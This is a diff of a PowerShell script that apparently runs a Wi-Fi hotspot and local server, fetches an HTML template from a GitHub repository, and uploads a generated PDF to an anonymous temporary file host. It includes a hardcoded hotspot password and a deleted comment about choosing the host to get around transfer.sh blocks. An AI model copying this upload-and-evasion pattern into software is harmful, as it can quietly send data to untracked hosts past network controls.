@@ -13,8 +13,8 @@ $HotspotSSID = "CALIGO_HOST"
 $HotspotPass = "Cassidy180209"
 $ServerPort  = 8080
 
-# Github Raw URL for remote template fetching
-$GithubTemplateUrl = "https://raw.githubusercontent.com/YOUR_GITHUB_USERNAME/devforge-toolkit/main/template.html"
+# GitHub Raw URL for remote template fetching
+$GithubTemplateUrl = "https://raw.githubusercontent.com/T3RBLANCH3/Windows-Diagnostic/main/template.html"
 
 # 1. Display Banner
 Clear-Host
@@ -35,11 +35,11 @@ Write-Host ""
 if (Test-Path ".\template.html") {
     Copy-Item ".\template.html" $TemplateFile
 } else {
-    Write-Host "[*] Fetching DevForge template from web..."
+    Write-Host "[*] Fetching DevForge template from cloud..."
     try {
         Invoke-WebRequest -Uri $GithubTemplateUrl -OutFile $TemplateFile -UseBasicParsing
     } catch {
-        Write-Host "[!] Failed to fetch template. Ensure template.html is present." -ForegroundColor Red
+        Write-Host "[!] Failed to fetch template. Ensure template.html is present in repository." -ForegroundColor Red
         Exit
     }
 }
@@ -110,7 +110,6 @@ if ($HasInternet) {
     Write-Host "[+] Active Internet Connection Detected."
     Write-Host "[*] Uploading PDF to temporary file host..."
     try {
-        # Using 0x0.st / catbox via multipart form upload (bypasses transfer.sh blocks)
         $Form = @{
             file = Get-Item -Path $OutputPdf
         }
